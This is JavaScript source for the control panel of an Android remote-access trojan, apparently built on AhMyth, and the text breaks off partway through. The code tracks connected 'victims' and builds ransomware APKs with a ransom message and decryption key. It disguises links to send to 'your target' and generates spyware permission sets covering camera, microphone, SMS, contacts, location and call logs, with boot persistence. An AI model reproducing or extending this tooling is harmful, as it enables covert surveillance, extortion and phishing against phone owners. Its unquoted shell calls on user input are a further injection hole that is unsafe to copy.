var app = angular.module('myapp', []);
const { remote } = require('electron');
var dialog = remote.dialog;
const { ipcRenderer } = require('electron');
var fs = require('fs-extra')
var victimsList = remote.require('./main');
const CONSTANTS = require(__dirname + '/assets/js/Constants')
var homeDir = require('homedir');
var path = require("path");
var exec = require('child_process').exec, child;
//--------------------------------------------------------------
var viclist = {};
var dataPath = path.join(homeDir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
//--------------------------------------------------------------



// App Controller for (index.html)
app.controller("AppCtrl", ($scope) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = { enable: false, method: 'BOOT' }; //default values for binding apk
    //$appCtrl.permissionsCustom = method: 'BOOT'; //default value for permissions of apk
    var log = document.getElementById("log");
    $appCtrl.logs = [];
    $('.menu .item')
        .tab();
    $('.ui.dropdown')
        .dropdown();

    const window = remote.getCurrentWindow();
    $appCtrl.close = () => {
        window.close();
    };

    $appCtrl.minimize = () => {
        window.minimize();
    };

    // when user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        // notify the main proccess about the port and let him start listening
        ipcRenderer.send("SocketIO:Listen", port);
        $appCtrl.Log("Listening on port => " + port, CONSTANTS.logStatus.SUCCESS);
    }


    // fired when main proccess (main.js) sends any new notification about new victim
    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        // add the new victim to the list
        viclist[index] = victimsList.getVictim(index);
        $appCtrl.Log("New victim from " + viclist[index].ip);
        $appCtrl.$apply();
    });


    // fired if listening brings error
    ipcRenderer.on("SocketIO:Listen", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply()
    });


    // fired when main proccess (main.js) send any new notification about disconnected victim
    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        $appCtrl.Log("Victim disconnected " + viclist[index].ip);
        // delete him from list
        delete viclist[index];
        $appCtrl.$apply();
    });


    // notify the main proccess (main.js) to open the lab
    $appCtrl.openLab = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    }


    // app logs to print any new log in the black terminal
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;

        $appCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
        log.scrollTop = log.scrollHeight;
        if (!$appCtrl.$$phase)
            $appCtrl.$apply();
    }



    // function to open the dialog and choose apk to be bindded
    $appCtrl.BrowseApk = () => {
        dialog.showOpenDialog({}, {

            properties: ['openFile']
        }).then(result => {

            if(result.canceled) {

                $appCtrl.Log("No file selected");
            } else {

                $appCtrl.Log("File choosen  " + result.filePaths[0]);
                readFile(result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log("No file selected");
        })

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }
    }

    // function to select decompiled APK folder for retry
    $appCtrl.BrowseFolder = () => dialog.showOpenDialog({
        properties: ['openDirectory']
        }).then(result => {
            if(result.canceled) {
                $appCtrl.Log("No APK folder selected");
            } else {
                $appCtrl.Log("APK Folder Chosen " + result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log("No APK folder chosen")
        })

        function readdir(filepath) {
            $appCtrl.filePath = filepath
            $appCtrl.$apply();
        }

    // function to run sara python file

        $appCtrl.callsarapy = () => {
          $appCtrl.Log('Getting Icon from path input ', '..');
          var iconransome = document.getElementById('icon').value
          $appCtrl.Log('Applying APK name from input ', '..');
          var nameransome = document.getElementById('name').value
          $appCtrl.Log('Applying APK title from input ', '..');
          var titleransome = document.getElementById('title').value
          $appCtrl.Log('Inserting Ransomware title from input ', '..');
          var descransome = document.getElementById('desc').value
          $appCtrl.Log('Inserting Ransomware description from input ', '..');
          var keyransome = document.getElementById('key').value
          $appCtrl.Log('Building Ransomware APK ', '..');
          var createRansom = exec("cd SARA && python3 sara.py "+iconransome+" "+nameransome+" "+titleransome+" "+descransome+" "+keyransome,
            function (error, stdout, stderr) {
               // console.log('stdout: ' + stdout);
               // console.log('stderr: ' + stderr);
                if (error !== null) {
                    if (iconransome.length == 0){
                        $appCtrl.Log('Please input the path to the PNG to be used', CONSTANTS.logStatus.FAIL);
                        }
                    if (nameransome.length == 0){
                        $appCtrl.Log('Please input the name of the APK to be used', CONSTANTS.logStatus.FAIL);
                        }
                    if (titleransome.length == 0){
                        $appCtrl.Log('Please Input an Encryption Message Title', CONSTANTS.logStatus.FAIL);
                        }
                    if (descransome.length == 0){
                        $appCtrl.Log('Please type out the Encryption Message', CONSTANTS.logStatus.FAIL);
                        }
                    if (keyransome.length == 0){
                        $appCtrl.Log('Please Input a Decryption Key', CONSTANTS.logStatus.FAIL);
                        }
                        $appCtrl.Log('Ransomware Build Failed', CONSTANTS.logStatus.FAIL);
                        return;
                        
                    }
                    
                    if (err) throw err, 
                    $appCtrl.Log('Ransomware Built Successfully ', CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log('The APK has been built on ' + 'AhMyth/AhMyth-Server/SARA/', CONSTANTS.logStatus.SUCCESS);
                });
            }
        //function to locate ransom
    $appCtrl.Check = () => {
        var nameransome = document.getElementById('name').value
        var pathrans = "SARA/"+nameransome+".apk";
        if (fs.existsSync(pathrans)) {
            $appCtrl.Log('Ransomware Built Successfully ', CONSTANTS.logStatus.SUCCESS);
            $appCtrl.Log('The APK has been built on ' + 'AhMyth/AhMyth-Server/SARA/'+nameransome+".apk", CONSTANTS.logStatus.SUCCESS);}

    }

    // function to run mask python file

    $appCtrl.callmaskpy = () => {
          var targetmask = document.getElementById('targeturl').value
          var hiddenmask = document.getElementById('hiddenurl').value          
          var keywordmask = "-"
          child = exec("cd maskurl && python3 maskurl.py --target "+targetmask+" --mask "+hiddenmask+" --keywords "+keywordmask,
            function (error, stdout, stderr) {
                //console.log('stdout: ' + stdout);
                //console.log('stderr: ' + stderr);
                if (error !== null) {
                    if (targetmask.length == 0){
                        $appCtrl.Log('Please Input The Desired URL To Be Hidden', CONSTANTS.logStatus.FAIL);
                        }
                    if (hiddenmask.length == 0){
                        $appCtrl.Log('Please Input the URL To Hide By', CONSTANTS.logStatus.FAIL);
                        }
                        return;
                        
                    }
                if (stdout.length != 0) {
                    $appCtrl.Log(stdout+"     Just Copy This Url And Send It To Your Target ;)");

                    //console.log('exec error: ' + error);
                    return;

    
                }
            });
    }



    // function to build the apk and sign it
    $appCtrl.GenerateApk = (apkFolder) => {
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6"); 
        var checkBoxofCallsLogs = document.getElementById("Permissions7");
        //if all unchecked
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = CONSTANTS.permissions
        }
        //if all checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = CONSTANTS.permissions
        }
        //if only one selected
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>            
`
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>           
    ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        
    ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>       
    ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/> ` 
        }        

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>   
            `
        }        
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>   
            ` 
        }  
        //if six checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>  
            ` 
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>`          
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
        }
        //if two are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         `
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
